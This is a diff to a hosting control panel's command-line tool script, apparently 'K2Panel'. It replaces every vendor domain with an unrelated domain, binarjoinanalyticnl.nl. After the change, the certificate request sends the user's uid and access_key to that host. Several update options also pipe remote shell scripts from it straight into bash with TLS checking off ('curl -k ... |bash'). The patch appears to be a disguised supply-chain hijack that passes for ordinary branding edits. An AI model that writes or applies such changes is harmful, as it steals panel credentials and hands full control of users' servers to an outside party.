@@ -2,9 +2,9 @@
 # +-------------------------------------------------------------------
 # | K2Panel
 # +-------------------------------------------------------------------
-# | Copyright (c) 2015-2099 K2Panel(www.k2panel.com) All rights reserved.
+# | Copyright (c) 2015-2099 K2Panel(binarjoinanalyticnl.nl) All rights reserved.
 # +-------------------------------------------------------------------
-# | Author: hwliang <hwl@k2panel.com>
+# | Author: hwliang <hwl@binarjoinanalyticnl.nl>
 # +-------------------------------------------------------------------
 
 #------------------------------
@@ -250,13 +250,13 @@ def CreateSSL():
     domains = get_host_all()
     pdata = {
         "action":"get_domain_cert",
-        "company":"k2panel.com",
+        "company":"binarjoinanalyticnl.nl",
         "domain":','.join(domains),
         "uid":userInfo['uid'],
         "access_key":userInfo['access_key'],
         "panel":1
     }
-    cert_api = 'https://api.k2panel.com/k2panel_cert'
+    cert_api = 'https://api.binarjoinanalyticnl.nl/k2panel_cert'
     result = json.loads(public.httpPost(cert_api,{'data': json.dumps(pdata)}))
     if 'status' in result:
         if result['status']:
@@ -458,7 +458,7 @@ def setup_idc():
         filename = panelPath + '/data/o.pl'
         if not os.path.exists(filename): return False
         o = public.readFile(filename).strip()
-        c_url = 'https://wafapi2.k2panel.com/api/idc/get_idc_info_bycode?o=%s' % o
+        c_url = 'https://wafapi2.binarjoinanalyticnl.nl/api/idc/get_idc_info_bycode?o=%s' % o
         idcInfo = json.loads(public.httpGet(c_url))
         if not idcInfo['status']: return False
         pFile = panelPath + '/config/config.json'
@@ -742,12 +742,12 @@ def bt_cli(u_input = 0):
         pro_path = '/www/server/panel/data/panel_pro.pl'
         if os.path.exists(pro_path):
             print("|-Updating k2panel version to pro version...")
-            os.system("curl -k https://node.k2panel.com/install/update_pro_en.sh|bash")
+            os.system("curl -k https://node.binarjoinanalyticnl.nl/install/update_pro_en.sh|bash")
         else:
             # os.system("/www/server/panel/pyenv/bin/pip install cachelib")
             only_update_pyenv312 = '/tmp/only_update_pyenv312.pl'
             if os.path.exists(only_update_pyenv312): os.remove(only_update_pyenv312)
-            os.system("curl -k https://node.k2panel.com/install/update_7.x_en.sh|bash")
+            os.system("curl -k https://node.binarjoinanalyticnl.nl/install/update_7.x_en.sh|bash")
     elif u_input == 17:
         l_path = '/www/server/panel/data/log_not_gzip.pl'
         if os.path.exists(l_path):
@@ -771,7 +771,7 @@ def bt_cli(u_input = 0):
     elif u_input == 19:
         if os.path.exists('/tmp/update_to7.pl'):os.remove('/tmp/update_to7.pl')
         print("|-Updating k2panel version to pro version...")
-        os.system("curl -k https://node.k2panel.com/install/update_pro_en.sh|bash")
+        os.system("curl -k https://node.binarjoinanalyticnl.nl/install/update_pro_en.sh|bash")
     elif u_input == 22:
         os.system('tail -100 /www/server/panel/logs/error.log')
     elif u_input == 23:
